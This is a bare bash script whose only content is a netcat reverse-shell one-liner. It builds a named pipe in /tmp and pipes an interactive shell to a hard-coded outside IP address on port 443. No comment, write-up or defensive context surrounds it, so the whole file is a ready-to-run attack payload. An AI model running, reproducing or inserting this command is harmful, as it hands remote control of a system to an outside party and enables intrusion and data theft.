#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/sh -i 2>&1|nc 35.236.161.97 443 >/tmp/f